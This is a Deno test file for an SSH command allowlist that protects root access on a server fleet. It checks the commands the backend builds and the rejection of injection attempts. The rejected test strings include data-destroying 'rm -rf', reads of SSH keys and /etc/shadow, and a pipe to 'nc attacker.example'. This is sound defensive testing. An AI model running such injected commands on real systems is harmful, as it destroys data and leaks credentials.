import { assert, assertEquals, assertFalse } from "jsr:@std/assert@^1.0.0";
import { isCommandAllowed } from "./ssh.ts";

// isCommandAllowed is the ONLY thing standing between a caller and a root shell on
// the platform droplet — executeCommand consults it on every call and refuses
// anything that doesn't match.
//
// The first block below is the load-bearing one: every command string the backend
// actually builds. Because the allowlist is now enforced at the chokepoint rather
// than by ~20 individual callers, a command that fails to match no longer fails
// loudly at review time — it fails in production, as a feature that silently stops
// working. Anything added to a route or MCP tool belongs here too.

Deno.test("allowlist accepts every command the backend builds", async (t) => {
  const realCommands: Record<string, string> = {
    // routes/create.ts
    "create: wb c add": "wb c add sierraleone",
    "create: wb init-nginx": "wb init-nginx sierraleone",
    "create: wb init-ssl": "wb init-ssl sierraleone",
    "create: wb init-dirs": "wb init-dirs sierraleone",
    // create.ts verifyResources — previously ran with NO caller-side check
    "create: wb c show": "wb c show sierraleone",
    "create: wb list-nginx": "wb list-nginx",
    "create: wb list-ssl": "wb list-ssl",
    "create: du on volume": "du -BG --max-depth=1 /mnt/fastr_volume_1",

    // routes/remove.ts
    "remove: wb c remove": "wb c remove sierraleone --force",
    "remove: wb remove-nginx": "wb remove-nginx sierraleone",
    "remove: wb remove-dirs": "wb remove-dirs sierraleone --force",
    "remove: piped remove-ssl": `printf "revoke sierraleone\\n" | wb remove-ssl sierraleone`,

    // routes/servers.ts — lifecycle
    "servers: restart one": "wb restart sierraleone",
    "servers: restart central": "wb run-central central",
    "servers: restart bulk": "wb restart sierraleone ethiopia kenya",
    "servers: run one": "wb run sierraleone",
    "servers: stop one": "wb stop sierraleone",
    "servers: stop bulk": "wb stop sierraleone ethiopia",

    // routes/servers.ts — config updates
    "servers: update version": "wb c update sierraleone --server 1.64.7",
    "servers: update version bulk": "wb c update sierraleone ethiopia --server 1.64.7",
    "servers: set french": "wb c update sierraleone --french true",
    "servers: set portuguese": "wb c update sierraleone --portuguese false",
    "servers: set ethiopian": "wb c update ethiopia --ethiopian true",
    "servers: set fiscal year": "wb c update sierraleone --fiscal-year july",
    "servers: clear fiscal year": "wb c update sierraleone --fiscal-year none",
    "servers: set iso3": "wb c update sierraleone --country-iso3 SLE",
    // Somaliland has no ISO3 code — the pattern deliberately allows 2-24 letters
    "servers: set non-iso3 country": "wb c update somaliland --country-iso3 Somaliland",
    "servers: set open access": "wb c update sierraleone --open-access true",
    "servers: set volume": "wb c update sierraleone --volume fastr_volume_1",
    "servers: set label": `wb c update sierraleone --label "Sierra Leone"`,

    // routes/servers.ts — logs. Now ALWAYS carries --tail; the bare form is gone.
    "servers: docker logs tailed": "docker logs sierraleone --tail 500",
    "servers: docker logs tail 0": "docker logs sierraleone --tail 0",
    "servers: docker inspect":
      `docker inspect -f '{{.Id}} {{.State.Status}} {{.State.ExitCode}}' sierraleone`,

    // routes/docker.ts
    "docker: pull server image": "docker pull timroberton/comb:wb-fastr-server-v1.64.7",
    "docker: pull central image": "docker pull timroberton/comb:wb-fastr-central-v1.64.7",
    "docker: list image tags": `docker images --format "{{.Tag}}" timroberton/comb`,

    // routes/volumes.ts + mcp/tools/volumes.ts
    "volumes: list mnt": "ls /mnt",
    "volumes: df on volume": "df -BG /mnt/fastr_volume_1",
    "volumes: resize2fs":
      "resize2fs /dev/disk/by-id/scsi-0DO_Volume_fastr_volume_1",

    // mcp/tools/fleet.ts + server_ops.ts
    "mcp: docker logs tailed": "docker logs sierraleone --tail 200",
    "mcp: crash log tail": "docker logs sierraleone --tail 20",
  };

  for (const [name, command] of Object.entries(realCommands)) {
    await t.step(name, () => {
      assert(
        isCommandAllowed(command),
        `Allowlist would BLOCK a command the backend actually builds:\n  ${command}`,
      );
    });
  }
});

Deno.test("allowlist rejects shell metacharacters in interpolated values", () => {
  const injections = [
    "wb c show sierraleone; rm -rf /mnt",
    "wb c show sierraleone && cat /root/.ssh/id_rsa",
    "wb c show sierraleone | nc attacker.example 1234",
    "wb restart $(cat /etc/shadow)",
    "wb restart `whoami`",
    "docker logs sierraleone --tail 5; wb stop all",
    "du -BG --max-depth=1 /mnt/../root",
    "df -BG /mnt/vol; echo pwned",
    `wb c update sierraleone --label "x"; wb stop all #"`,
    "wb c update sierraleone --label \"$(id)\"",
    "resize2fs /dev/disk/by-id/scsi-0DO_Volume_vol; reboot",
    "docker pull timroberton/comb:v1 && rm -rf /",
  ];

  for (const command of injections) {
    assertFalse(
      isCommandAllowed(command),
      `Allowlist ALLOWED an injection attempt:\n  ${command}`,
    );
  }
});

Deno.test("allowlist rejects commands that are simply not on it", () => {
  const notAllowed = [
    "",
    " ",
    "cat /etc/passwd",
    "rm -rf /mnt/fastr_volume_1",
    "systemctl stop docker",
    "wb c nuke everything",
    "docker exec -it sierraleone sh",
    "docker rm -f sierraleone",
    // Trailing/leading whitespace must not sneak past the anchors
    " wb c list",
    "wb c list ",
    // Newline-separated second command
    "wb c list\nrm -rf /mnt",
  ];

  for (const command of notAllowed) {
    assertFalse(
      isCommandAllowed(command),
      `Allowlist ALLOWED a command that is not on it:\n  ${command}`,
    );
  }
});

Deno.test("label pattern excludes the characters that would break out of its quotes", () => {
  assert(isCommandAllowed(`wb c update x --label "Perfectly Normal Label"`));
  assert(isCommandAllowed(`wb c update x --label "Côte d'Ivoire"`));

  for (const bad of ['"', "$", "`", "\\"]) {
    assertFalse(
      isCommandAllowed(`wb c update x --label "lab${bad}el"`),
      `label pattern allowed ${JSON.stringify(bad)}, which escapes the shell quoting`,
    );
  }
});

Deno.test("docker logs tail argument must be numeric", () => {
  assert(isCommandAllowed("docker logs x --tail 100"));
  assertFalse(isCommandAllowed("docker logs x --tail abc"));
  assertFalse(isCommandAllowed("docker logs x --tail -1"));
  assertFalse(isCommandAllowed("docker logs x --tail 100 extra"));
});

Deno.test("an unbounded docker logs fetch cannot be expressed", () => {
  // The bare form returns the container's entire history since start. It is off
  // the allowlist on purpose, so re-introducing an unbounded fetch fails here
  // rather than quietly costing hundreds of MB per poll in production.
  assertFalse(isCommandAllowed("docker logs sierraleone"));
});

Deno.test("volume paths are confined to /mnt", () => {
  assert(isCommandAllowed("du -BG --max-depth=1 /mnt/fastr_volume_1"));
  assertEquals(isCommandAllowed("du -BG --max-depth=1 /root"), false);
  assertEquals(isCommandAllowed("du -BG --max-depth=1 /mnt/a/b"), false);
  assertEquals(isCommandAllowed("df -BG /etc"), false);
});
